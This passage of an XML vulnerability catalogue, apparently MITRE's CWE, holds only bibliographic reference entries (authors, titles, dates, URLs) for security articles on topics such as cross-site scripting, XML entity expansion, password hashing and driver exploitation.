			<ns0:URL>https://csrc.nist.gov/csrc/media/publications/conference-paper/1996/10/22/proceedings-of-the-19th-nissc-1996/documents/paper057/paper.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-578">
			<ns0:Author>NetSec</ns0:Author>
			<ns0:Title>NetSec Security Advisory: Multiple Vulnerabilities Resulting From Use Of Apple OSX HFS+</ns0:Title>
			<ns0:Publication>BugTraq</ns0:Publication>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/bugtraq/2005/Feb/309</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-594">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 21 - Incorrect Permission Assignment for Critical Response</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/24/top-25-series-rank-21-incorrect-permission-assignment-for-critical-response</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-622">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 15 - Improper Check for Unusual or Exceptional Conditions</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-631">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Password Storage Cheat Sheet</ns0:Title>
			<ns0:URL>https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-632">
			<ns0:Author>Thomas Ptacek</ns0:Author>
			<ns0:Title>Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>http://hashphp.org/hashing.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-633">
			<ns0:Author>Robert Graham</ns0:Author>
			<ns0:Title>The Importance of Being Canonical</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://blog.erratasec.com/2009/02/importance-of-being-canonical.html#.ZCbyY7LMJPY</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-634">
			<ns0:Author>James McGlinn</ns0:Author>
			<ns0:Title>Password Hashing</ns0:Title>
			<ns0:URL>https://privacyaustralia.net/phpsec/articles/password-hashing/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-635">
			<ns0:Author>Jeff Atwood</ns0:Author>
			<ns0:Title>Rainbow Hash Cracking</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://blog.codinghorror.com/rainbow-hash-cracking/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-636">
			<ns0:Author>Jeff Atwood</ns0:Author>
			<ns0:Title>Speed Hashing</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://blog.codinghorror.com/speed-hashing/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-637">
			<ns0:Title>Rainbow table</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Rainbow_table</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-657">
			<ns0:Title>boost C++ Library Smart Pointers</ns0:Title>
			<ns0:URL>https://www.boost.org/doc/libs/1_38_0/libs/smart_ptr/smart_ptr.htm</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-667">
			<ns0:Author>Rafal Los</ns0:Author>
			<ns0:Title>Real-Life Example of a 'Business Logic Defect' (Screen Shots!)</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:URL>http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-672">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 22 - Allocation of Resources Without Limits or Throttling</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://web.archive.org/web/20170113055136/https://software-security.sans.org/blog/2010/03/23/top-25-series-rank-22-allocation-of-resources-without-limits-or-throttling/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-676">
			<ns0:Author>Amit Klein</ns0:Author>
			<ns0:Title>Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/fulldisclosure/2002/Dec/229</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-677">
			<ns0:Author>Rami Jaamour</ns0:Author>
			<ns0:Title>XML security: Preventing XML bombs</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>http://searchsoftwarequality.techtarget.com/expert/KnowledgebaseAnswer/0,289625,sid92_gci1168442,00.html?asrc=SS_CLA_302%20%20558&amp;psrc=CLT_92#</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-678">
			<ns0:Author>Didier Stevens</ns0:Author>
			<ns0:Title>Dismantling an XML-Bomb</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://blog.didierstevens.com/2008/09/23/dismantling-an-xml-bomb/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-679">
			<ns0:Author>Robert Auger</ns0:Author>
			<ns0:Title>XML Entity Expansion</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13247002/XML%20Entity%20Expansion</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-680">
			<ns0:Author>Elliotte Rusty Harold</ns0:Author>
			<ns0:Title>Tip: Configure SAX parsers for secure processing</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20101005080451/http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-682">
			<ns0:Author>Blaise Doughan</ns0:Author>
			<ns0:Title>Preventing Entity Expansion Attacks in JAXB</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>http://blog.bdoughan.com/2011/03/preventing-entity-expansion-attacks-in.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-685">
			<ns0:Author>Pascal Meunier</ns0:Author>
			<ns0:Title>Meta-Character Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20100714032622/https://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-686">
			<ns0:Author>Robert Auger</ns0:Author>
			<ns0:Title>OS Commanding</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:URL>http://projects.webappsec.org/w/page/13246950/OS%20Commanding</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-687">
			<ns0:Author>Lincoln Stein</ns0:Author>
			<ns0:Author>John Stewart</ns0:Author>
			<ns0:Title>The World Wide Web Security FAQ</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://www.w3.org/Security/Faq/wwwsf4.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-688">
			<ns0:Author>Jordan Dimov, Cigital</ns0:Author>
			<ns0:Title>Security Issues in Perl Scripts</ns0:Title>
			<ns0:URL>https://www.cgisecurity.com/lib/sips.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-690">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 9 - OS Command Injection</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-9-os-command-injection/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-694">
			<ns0:Author>Ronald L. Rivest</ns0:Author>
			<ns0:Author>Burt Kaliski</ns0:Author>
			<ns0:Title>RSA Problem</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-695">
			<ns0:Title>Optimal Asymmetric Encryption Padding</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-696">
			<ns0:Author>Ruben Santamarta</ns0:Author>
			<ns0:Title>Exploiting Common Flaws in Drivers</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>http://reversemode.com/index.php?option=com_content&amp;task=view&amp;id=38&amp;Itemid=1</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-697">
			<ns0:Author>Yuriy Bulygin</ns0:Author>
			<ns0:Title>Remote and Local Exploitation of Network Drivers</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://www.blackhat.com/presentations/bh-usa-07/Bulygin/Presentation/bh-usa-07-bulygin.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-698">
			<ns0:Author>Anibal Sacco</ns0:Author>
			<ns0:Title>Windows driver vulnerabilities: the METHOD_NEITHER odyssey</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-18.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-699">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Buffer Descriptions for I/O Control Codes</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-700">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Using Neither Buffered Nor Direct I/O</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-701">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Securing Device Objects</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/controlling-device-access</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-702">
			<ns0:Author>Piotr Bania</ns0:Author>
			<ns0:Title>Exploiting Windows Device Drivers</ns0:Title>
			<ns0:URL>https://www.piotrbania.com/all/articles/ewdd.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-704">
			<ns0:Author>CERT</ns0:Author>
			<ns0:Title>EXP00-C. Use parentheses for precedence of operation</ns0:Title>
			<ns0:URL>https://www.securecoding.cert.org/confluence/display/seccode/EXP00-C.+Use+parentheses+for+precedence+of+operation</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-706">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Unforgivable Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>http://cve.mitre.org/docs/docs-2007/unforgivable.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-709">
			<ns0:Author>Jeremiah Grossman</ns0:Author>
			<ns0:Author>Robert "RSnake" Hansen</ns0:Author>
			<ns0:Author>Petko "pdp" D. Petkov</ns0:Author>
			<ns0:Author>Anton Rager</ns0:Author>
			<ns0:Author>Seth Fogie</ns0:Author>
			<ns0:Title>XSS Attacks</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publisher>Syngress</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-712">
			<ns0:Title>Cross-site scripting</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Cross-site_scripting</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-714">
			<ns0:Author>RSnake</ns0:Author>
			<ns0:Title>XSS (Cross Site Scripting) Cheat Sheet</ns0:Title>
			<ns0:URL>http://ha.ckers.org/xss.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-715">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Mitigating Cross-site Scripting With HTTP-only Cookies</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-716">
			<ns0:Author>Mark Curphey, Microsoft</ns0:Author>
			<ns0:Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/archive/blogs/cisg/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-718">
			<ns0:Author>Ivan Ristic</ns0:Author>
			<ns0:Title>XSS Defense HOWTO</ns0:Title>
			<ns0:URL>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/xss-defense-howto/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-719">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Web Application Firewall</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Web_Application_Firewall</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-720">
			<ns0:Author>Web Application Security Consortium</ns0:Author>
			<ns0:Title>Web Application Firewall Evaluation Criteria</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13246985/Web%20Application%20Firewall%20Evaluation%20Criteria</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-721">
			<ns0:Author>RSnake</ns0:Author>
			<ns0:Title>Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-722">
			<ns0:Title>XMLHttpRequest allows reading HTTPOnly cookies</ns0:Title>
			<ns0:Publisher>Mozilla</ns0:Publisher>
			<ns0:URL>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-723">
			<ns0:Title>Apache Wicket</ns0:Title>
			<ns0:URL>http://wicket.apache.org/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-724">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>XSS (Cross Site Scripting) Prevention Cheat Sheet</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-725">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>DOM based XSS Prevention Cheat Sheet</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-726">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 series - Rank 1 - Cross Site Scripting</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-1-cross-site-scripting/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-729">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 11 - Hardcoded Credentials</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-11-hardcoded-credentials/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-731">
			<ns0:Author>Web Application Security Consortium</ns0:Author>
			<ns0:Title>Insufficient Anti-automation</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/Insufficient+Anti-automation</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-741">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 12 - Buffer Access with Incorrect Length Value</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://web.archive.org/web/20100316043717/http://blogs.sans.org:80/appsecstreetfighter/2010/03/11/top-25-series-rank-12-buffer-access-with-incorrect-length-value/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-754">
			<ns0:Author>Frank Kim</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-756">
			<ns0:Author>Scott Mitchell</ns0:Author>
			<ns0:Title>Understanding ASP.NET View State</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:Publisher>Microsoft</ns0:Publisher>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976(v=msdn.10)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-773">
			<ns0:Author>Daniel Kulp</ns0:Author>
			<ns0:Title>Apache CXF Security Advisory (CVE-2010-2076)</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>http://svn.apache.org/repos/asf/cxf/trunk/security/CVE-2010-2076.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-778">
			<ns0:Author>Jeremiah Grossman</ns0:Author>
			<ns0:Title>Third-Party Web Widget Security FAQ</ns0:Title>
			<ns0:URL>https://blog.jeremiahgrossman.com/2010/07/third-party-web-widget-security-faq.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-783">
			<ns0:Author>Robert C. Seacord</ns0:Author>
			<ns0:Title>Secure Coding in C and C++</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publisher>Addison Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-786">
			<ns0:Author>Jim Manico</ns0:Author>
			<ns0:Title>Injection-safe templating languages</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://manicode.blogspot.com/2010/06/injection-safe-templating-languages_30.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-787">
			<ns0:Author>Dinis Cruz</ns0:Author>
			<ns0:Title>Can we please stop saying that XSS is boring and easy to fix!</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>http://diniscruz.blogspot.com/2010/09/can-we-please-stop-saying-that-xss-is.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-788">
			<ns0:Author>Ivan Ristic</ns0:Author>
			<ns0:Title>Canoe: XSS prevention via context-aware output encoding</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://blog.ivanristic.com/2010/09/introducing-canoe-context-aware-output-encoding-for-xss-prevention.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-789">
			<ns0:Author>Jim Manico</ns0:Author>
			<ns0:Title>What is the Future of Automated XSS Defense Tools?</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>http://software-security.sans.org/downloads/appsec-2011-files/manico-appsec-future-tools.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-795">
			<ns0:Author>Jeremiah Grossman</ns0:Author>
			<ns0:Title>Business Logic Flaws and Yahoo Games</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://blog.jeremiahgrossman.com/2006/12/business-logic-flaws.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-796">
			<ns0:Author>Jeremiah Grossman</ns0:Author>
			<ns0:Title>Seven Business Logic Flaws That Put Your Website At Risk</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:URL>https://docplayer.net/10021793-Seven-business-logic-flaws-that-put-your-website-at-risk.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-797">
			<ns0:Author>WhiteHat Security</ns0:Author>
			<ns0:Title>Business Logic Flaws</ns0:Title>
			<ns0:URL>https://web.archive.org/web/20080720171327/http://www.whitehatsec.com/home/solutions/BL_auction.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-799">
			<ns0:Author>Rafal Los</ns0:Author>
			<ns0:Author>Prajakta Jagdale</ns0:Author>
			<ns0:Title>Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
